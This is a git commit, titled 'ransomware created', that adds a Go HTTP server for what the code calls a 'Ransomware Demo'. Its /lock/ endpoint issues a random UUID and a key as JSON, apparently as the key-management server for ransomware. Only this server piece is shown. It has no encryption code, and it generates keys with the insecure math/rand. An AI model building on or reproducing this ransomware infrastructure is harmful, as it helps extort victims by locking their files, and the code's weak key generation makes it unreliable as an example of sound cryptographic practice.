7c2eec88870115a858b70772c0cdb2e65409d76c
root <root@localhost.localdomain>
2019-01-22 21:32:01 -0800

    ransomware created

---
+++ ransomware/server/server.go
@@ -0,0 +1,54 @@
+package main
+
+import (
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"math/rand"
+	"net/http"
+)
+
+//Member -
+type Key struct {
+	Uuid string
+	Key  string
+}
+
+const (
+	Address = ":80"
+)
+
+func main() {
+	http.HandleFunc("/", handleMain)
+	http.HandleFunc("/lock/", handleLock)
+
+	fs := http.FileServer(http.Dir("static"))
+	http.Handle("/static/", http.StripPrefix("/static/", fs))
+
+	fmt.Println("Listening on", Address)
+	http.ListenAndServe(Address, nil)
+}
+
+func handleMain(w http.ResponseWriter, r *http.Request) {
+	fmt.Fprintf(w, "Welcome To Ransomware Demo!")
+}
+
+func handleLock(w http.ResponseWriter, r *http.Request) {
+	key := Key{getRandomKey(8), getRandomKey(8)}
+	jsonBytes, err := json.Marshal(key)
+	if err != nil {
+		panic(err)
+	}
+
+	fmt.Fprintf(w, string(jsonBytes))
+}
+
+func getRandomKey(length int) string {
+	key := make([]byte, length)
+
+	_, err := rand.Read(key)
+	if err != nil {
+		panic(err)
+	}
+	return hex.EncodeToString(key)
+}
